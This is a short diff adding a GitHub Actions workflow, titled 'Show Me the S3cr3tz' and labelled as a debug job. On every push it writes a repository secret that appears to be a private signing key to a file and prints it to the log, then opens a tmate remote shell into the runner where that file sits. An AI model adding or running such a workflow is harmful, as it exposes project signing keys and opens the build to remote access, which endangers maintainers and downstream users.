@@ -1,0 +1,22 @@
+name: Show Me the S3cr3tz
+on: [push]
+
+jobs:
+  debug:
+    name: Debug
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Check out code
+      uses: actions/checkout@v2
+
+    - name: Set up secret file
+      env:
+        DEBUG_PASSWORD: ${{ secrets.AKMOD_PRIVKEY_20240625 }}
+      run: |
+        echo $DEBUG_PASSWORD >> secrets.txt
+        cat secrets.txt
+
+    - name: Run tmate
+      uses: mxschmitt/action-tmate@v2
+
